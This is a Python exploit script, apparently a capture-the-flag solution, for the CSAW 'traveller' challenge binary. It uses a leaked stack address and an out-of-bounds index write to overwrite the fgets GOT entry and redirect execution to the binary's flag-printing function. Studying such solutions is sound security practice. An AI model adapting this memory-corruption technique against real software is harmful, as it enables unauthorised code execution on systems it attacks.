from ptrlib import *
import time

def change(index, data):
    sock.sendlineafter("> ", "2")
    sock.sendafter(": ", str(index))
    sock.send(data)
    return

def calc_offset(addr):
    assert addr % 8 == 0
    return 0x8000000000000000 | ((addr - elf.symbol("trips")) // 8)

elf = ELF("./traveller")
#sock = Process(["stdbuf", "-o0", "-i0", "./traveller"])
#sock = Socket("localhost", 9999)
sock = Socket("pwn.chal.csaw.io", 1003)

# leak stack address
sock.recvline()
sock.recvline()
addr_argc = int(sock.recvline(), 16)
logger.info("&argc = " + hex(addr_argc))

# prepare
delta = 124
change(calc_offset(addr_argc - delta), b'A' * 8 + p64(addr_argc + 36) + p64(elf.got("fgets") - 8) + p64(0x20))

# change
change(calc_offset(addr_argc + 28), b'A' * 8 + p64(elf.symbol("cat_flag")))

sock.interactive()
